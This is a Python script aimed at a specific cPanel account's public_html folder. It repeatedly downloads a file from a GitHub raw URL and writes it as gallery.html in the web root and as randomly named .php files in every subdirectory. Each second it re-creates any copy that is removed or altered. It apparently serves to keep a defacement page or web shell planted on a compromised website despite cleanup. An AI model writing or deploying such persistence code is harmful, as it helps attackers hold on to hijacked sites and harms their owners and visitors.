import os
import stat
import hashlib
from urllib.request import urlopen
import time
import random
import string
paths_to_monitor = ['/cpaneldisk/home/greenshaktilife/public_html/']
url = 'https://raw.githubusercontent.com/khmer99/sulap/refs/heads/main/hatiku.html'
fixed_permission = 0o644
def get_original_hash():
    response = urlopen(url)
    data = response.read()
    return hashlib.md5(data).hexdigest()
original_hash = get_original_hash()
def generate_random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
def ensure_directory_exists(directory):
    os.makedirs(directory, exist_ok=True)
def restore_file(file_path, is_main_dir):
    print(f"File missing or tampered with. Restoring file to {file_path}...")
    ensure_directory_exists(os.path.dirname(file_path))
    response = urlopen(url)
    data = response.read()
    with open(file_path, 'wb') as f:
        f.write(data)
    os.chmod(file_path, fixed_permission)
def check_and_restore_files(directory, is_main_dir=False):
    if is_main_dir:
        file_name = 'gallery.html'
    else:
        file_name = f"{generate_random_name()}.php"
    file_path = os.path.join(directory, file_name)
    if not os.path.exists(file_path) or \
       hashlib.md5(open(file_path, 'rb').read()).hexdigest() != original_hash:
        restore_file(file_path, is_main_dir)
    else:
        current_permission = stat.S_IMODE(os.stat(file_path).st_mode)
        if current_permission != fixed_permission:
            print(f"Permission mismatch detected for {file_path}. Correcting...")
            os.chmod(file_path, fixed_permission)
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            check_and_restore_files(item_path)
while True:
    for path in paths_to_monitor:
        try:
            check_and_restore_files(path, is_main_dir=True)
        except Exception as e:
            print(f"An error occurred with {path}: {e}")
    time.sleep(1)
